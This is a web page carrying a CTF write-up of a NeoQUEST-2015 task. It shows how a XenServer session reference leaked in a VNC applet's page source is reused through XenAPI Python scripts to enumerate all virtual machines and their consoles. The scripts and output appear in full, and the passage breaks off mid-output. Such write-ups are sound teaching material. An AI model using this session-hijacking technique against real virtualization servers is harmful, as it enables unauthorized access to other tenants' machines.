<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We get access to the XenServer cloud through access to one virtual machine</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="On March 11, the online stage of the annual cybersecurity competition NeoQUEST-2016 will start soon! In anticipation of this, we publish the analysis ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We get access to the XenServer cloud through access to one virtual machine</h1><div class="post__text post__text-html js-mediator-article"><img align="left" src="https://habrastorage.org/files/db1/9c6/7c5/db19c67c51b04c94a548e49767217cc9.png">  On March 11, the online stage of the annual cybersecurity competition <a href="http://neoquest.ru/">NeoQUEST-2016</a> will start soon!  In anticipation of this, we publish the analysis of one of the tasks of the ‚Äúconfrontation‚Äù NeoQUEST-2015.  This task called ‚ÄúTruth is somewhere nearby‚Äù was aimed at gaining access to the entire XenServer cloud, having access only to one virtual machine!  Such a hack is possible using a special applet, previously used by XenServer, which allows you to access the virtual machine via VNC. <br><br>  Under the cut, we will describe the initial data for the task and describe how it was possible to complete this task in two ways: <br><ul><li>  using XenAPI </li><li>  using the web </li></ul><br><a name="habracut"></a><br><br><h4>  <b>Initial data</b> </h4><br>  Participants in the job description received an IP address where the site was located with a large ‚ÄúGet Key‚Äù button.  When it was pressed, an inscription appeared indicating that there were attempts to connect to two servers and attempts to find the key in the databases of these servers.  However, as informed by the same inscription, it was possible to connect only to the first server, and the key was not found there ... 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/files/a62/2dd/9ab/a622dd9ab65e4036bcd904f2f9003107.png"><br><br>  As you can see, it was possible to connect to server # 1, and even there is a link (the word ‚ÄúOK‚Äù).  When clicking on a link, an applet should start, but since modern browsers do not work well with applets, most likely nothing will start. <br><br><img src="https://habrastorage.org/files/9fb/3a5/94f/9fb3a594f68e49e6815198c81628ac4d.png"><br><br>  However, the very first link in Google says: ‚Äúyou need to add the site to the allowed Java settings and restart the browser‚Äù!  We do ... <br><br><img src="https://habrastorage.org/files/f66/88f/918/f6688f91838c45cbaf6be95e71106e56.png"><br><br>  After restarting the browser, the ‚ÄúSecure Warning‚Äù window appears, in which the Citrix System is written in the ‚ÄúPublisher‚Äù field. <br><br><img src="https://habrastorage.org/files/124/d19/d1f/124d19d1fab940118a2c281fa6233acf.png"><br><br>  By running the applet, the participant accessed the virtual machine.  And here he had to understand that he was given access to a virtual machine that runs on the basis of the Citrix product.  Googling what Citrix products are, we can assume that this is XenServer.  And to be sure of it, you can look at the site icon and see the XenServer logo there. <br><br><img src="https://habrastorage.org/files/175/bb7/17a/175bb717a4fe4f31be5c861f6d1e961f.png"><br><br>  On the desktop there is a shortcut to the Chrome browser, by running that and opening the story, you can find the call to "localhost / phpmyadmin".  Going to this address, you can see the neoquest database, in which there is a key table, but there are no records ... <br><br><img src="https://habrastorage.org/files/348/8e2/a37/3488e2a373b24c79a4fd7087c5479274.png"><br><br>  The virtual was one for all, and the participants actively fought for it, taking control of the mouse cursor from each other and preventing their rivals from viewing records in the database! <br><br>  Further searches for the key on this virtual machine are useless, attempts to find another virtual machine on the network will also fail (the second virtual machine does not have a network adapter). <br><br>  Looking at the source code of the page with the applet, we find the code responsible for its launch: <br><br><pre><code class="cpp hljs">&lt;applet archive=<span class="hljs-string"><span class="hljs-string">'/q.jar'</span></span> id=vncapp code=<span class="hljs-string"><span class="hljs-string">'com/xensource/ui/vnc/Initialize.class'</span></span> width=<span class="hljs-string"><span class="hljs-string">'950'</span></span> height=<span class="hljs-string"><span class="hljs-string">'720'</span></span>&gt; &lt;PARAM NAME=<span class="hljs-string"><span class="hljs-string">'SESSION'</span></span> VALUE = <span class="hljs-string"><span class="hljs-string">'OpaqueRef:427a76b3-2d50-89bb-28e6-eb9e51c66971'</span></span>/&gt; &lt;PARAM NAME=<span class="hljs-string"><span class="hljs-string">'URL'</span></span> VALUE =<span class="hljs-string"><span class="hljs-string">'https://10.0.20.61/console?uuid=b1c1a188-26bf-e5c8-a5ed-7545f17f492b'</span></span>/&gt; &lt;PARAM NAME=<span class="hljs-string"><span class="hljs-string">'USEURL'</span></span> VALUE =<span class="hljs-string"><span class="hljs-string">'true'</span></span>/&gt; &lt;/applet&gt;</code> </pre> <br><br>  At the start of the applet for the participant, two parameters are interesting: SESSION and URL.  From the URL you can see that there is another IP address - 10.0.20.61.  Go to this IP in the browser and see: ‚ÄúCitrix Systems, Inc.  XenServer 6.2.0 ‚Äù, which finally convinces us that the virtual machine works on XenServer! <br><br>  Now we start looking for a second virtual machine.  It is logical to assume that it is also accessed through the applet, through the URL parameter, namely, through the UUID value.  Therefore, for further experiments, it is necessary to run the applet on your computer.  The easiest way to do this is to save the html page with the applet (the applet must be downloaded separately) and run on your own web server. <br><br>  There are two ways to get the UUID value: via XenAPI or make a request to the server via a browser.  Consider both of these methods in order. <br><br><h4>  <b>Method number 1: use XenAPI</b> </h4><br>  This was the planned decision of the task.  The code will be written in Python, for this we download the SDK for XenServer and from there we take XenApi.py. <br>  We need to get a list of all the virtual machines on the server, and for them a list of their consoles. <br><br>  Googling how to get a list of virtual machines, you can find the following code: <br><br><pre> <code class="cpp hljs">session = XenAPI.Session(xen_url) session.xenapi.login_with_password(xen_user, xen_pass) vms = session.xenapi.VM.get_all() print vms</code> </pre><br><br>  Where xen_url is the server address, in our case ‚Äúhttps://10.0.20.61‚Äù, xen_user and xen_pass are not accessible to us, but we already have the value of the established session.  You can try instead of session.xenapi.VM.get_all () to transfer the value of the established session directly to the method as follows: session.VM.get_all (ses).  Then the script for getting the list of virtual machines will look like this: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> XenAPI xen_url = <span class="hljs-string"><span class="hljs-string">"https://10.0.20.61"</span></span> session = XenAPI.Session(xen_url) ses = <span class="hljs-string"><span class="hljs-string">"OpaqueRef:427a76b3-2d50-89bb-28e6-eb9e51c66971"</span></span> vms = session.VM.get_all(ses) print vms</code> </pre><br><br><div class="spoiler">  <b class="spoiler_title">The result of this script will look like this:</b> <div class="spoiler_text"><pre> <code class="cpp hljs">{<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: [<span class="hljs-string"><span class="hljs-string">'OpaqueRef:fed67a7d-74c2-3eeb-6a0d-e17348b5d68c'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:fdafee99-e69d-d6a8-6988-402bbac14215'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:fa649f83-3566-5734-9a25-fa236f6902af'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:f899e08e-7abc-032b-c098-f99ae5b4034a'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:f437e8ad-2e3c-edc5-81ae-207ac6c12079'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ef635a0a-209f-469f-1ab8-c014ecf4b7a5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ef31abb6-cd3e-2f12-bf94-3041b53a1a36'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ef129c0c-3dfc-9ead-d447-4c729a6d9b47'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ed097922-b78c-a4e6-aa9a-1cf47cc9c499'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ea183995-6c42-1cf2-6775-9a3a66493a4e'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:e894f069-7386-5327-ec44-33c83de477e7'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:e869d8d3-0238-253b-675c-8f04efa2db1d'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:e8135b8d-2564-2f48-0235-c1c6d4f539f0'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:e29608d0-802c-8920-a218-31907a28e2b5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:df6a1b82-5642-cd9f-9272-39118d9e565f'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:dbeee2e5-7745-a1ba-49e6-de4b3a5b518f'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:da163722-77cf-88a1-76ef-a87fbb9a789f'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:d6f55333-028d-8e1c-efcc-d2a05a9a53c1'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:d32bc06b-74ea-8250-3314-1a9c42338b3b'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ce95e498-5a6a-9076-785d-181843739e18'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:cb0498ee-a7ef-87e8-c292-488ff9b182c8'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:c8256666-2535-6f3e-3575-72ce28bf7943'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:c20d68a4-043f-6cd1-6465-170e61253ee0'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:bdceecb8-a079-0846-7fa1-a31cf9520b50'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:bcb3d8b8-f09c-edad-4cb8-82072121a57d'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:b7189aab-cf4e-ed42-a418-292c9d180614'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:b5d37caf-43bb-20eb-edde-9ecda9a90bbb'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:ae066542-4503-0d71-2303-95bdbb659944'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:a29c957f-4cb8-c085-65bb-5338022aeee5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:9b14ce06-d7b3-57c5-88ce-89784b198dd8'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:914316c7-d608-e7d0-b230-f57282bcf16c'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:8efe10a7-668b-bc25-ce23-30a9a25232ee'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:8df82c5d-e207-6f92-bac2-1320912d39a8'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:8a2c1418-6136-dadb-a027-79be66ed5cd6'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:88fae098-d089-2d9d-972d-f133c6f03e2f'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:83287204-9e5d-660d-8793-571c629d081c'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:81d6cf4e-359f-70d0-e325-b8be22336443'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:7e2f80af-8251-72d9-0d7f-77aea039a4d7'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:79c5b589-7dfa-ffb8-28d8-bcb076d16118'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:79b8f10e-681b-f5f1-49fc-4fab533eb29b'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:745a3e34-93eb-e63a-f2e0-dffa998c5c55'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:6e3f4400-847d-ee72-bd00-5d20e30aa885'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:6bc1c54a-5e3c-f201-0d6c-1c41eee98b94'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:6b446900-6a4f-0ec1-7725-aa5419b029ad'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:64072816-6999-7d73-bfd9-3a854447fcdd'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:60f71cfd-92d0-aeaf-85be-4480eef18f7a'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:608662aa-18cc-caff-b04e-52b095975940'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:605bca5f-40b7-c970-7d00-99b3159854bf'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:54b2ab62-9c68-9fb0-e130-cc20c1d72df8'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:4f99e67d-aac8-eb83-c0d0-b8cecb2196df'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:48e705dd-44b1-0261-095a-30dd175b7ec5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:429bdf24-7e41-76c6-7566-3bb5bcda6efa'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:3dfdb9b9-13d3-d5d2-86c1-0ac03d8bd835'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:3d7462c7-cea0-b3cd-8adb-62cc93ff7ae9'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:3cd87b61-0232-ad9b-48ac-43d8900e0cc5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:37d8fdda-e7e1-9376-85ac-e067e4db44b0'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:35d6d056-dabe-b731-9264-e7c5a55531af'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:34ac3f38-2329-e069-a3db-14954c0d1ba7'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:31db143b-0e37-4a7b-5d3e-11d200691be4'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:31148d7b-64ee-0d5d-8992-53a53c0d796e'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:3062dc3a-4298-bf2d-6190-17e5c8287c9a'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:2a825824-253a-d6d9-a6a8-f8ee05b772c9'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:271ca619-f84c-71c2-6db8-8d0def4ca9e3'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:25fd4564-5107-78e0-4229-bbb9c1138b12'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:23c62832-a906-df73-fed8-eda112419160'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:1ef59c47-e9f1-87ad-83b7-de67e35e3d7f'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:1d027e36-2364-e5af-5144-49e6243fac94'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:107d38cd-be64-9894-73bc-534e435747f5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:0d365a10-d9c3-c4b0-e2e4-51503736b4d5'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:06ec3fcb-6951-1fb4-a6b5-d48d0a51cd2c'</span></span>]}</code> </pre><br></div></div><br><br>  The result was quite large, and this is not a list of virtual machines, but links to them, so it is more logical to continue writing the script, so as to get the console.  To do this, we use the standard API function VM.get_consoles, as a result, the resulting script looks like: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> XenAPI xen_url = <span class="hljs-string"><span class="hljs-string">"https://10.0.20.61"</span></span> session = XenAPI.Session(xen_url) ses = <span class="hljs-string"><span class="hljs-string">"OpaqueRef:427a76b3-2d50-89bb-28e6-eb9e51c66971"</span></span> vms = session.VM.get_all(ses) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> vm in vms[<span class="hljs-string"><span class="hljs-string">'Value'</span></span>]: console = session.VM.get_consoles(ses,vm) print console</code> </pre><br><br><div class="spoiler">  <b class="spoiler_title">Script execution result:</b> <div class="spoiler_text"><pre> <code class="cpp hljs">{<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: [<span class="hljs-string"><span class="hljs-string">'OpaqueRef:f655d6a7-453f-7b4c-ad89-ccc438a8b5a0'</span></span>]} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: [<span class="hljs-string"><span class="hljs-string">'OpaqueRef:fa451706-1715-1688-a440-e63d18b7b55a'</span></span>, <span class="hljs-string"><span class="hljs-string">'OpaqueRef:70f202f8-ef56-275e-c17d-f7ff214a49f9'</span></span>]} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: [<span class="hljs-string"><span class="hljs-string">'OpaqueRef:9a08367f-3740-a192-ff49-2bc151a485ce'</span></span>]} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span 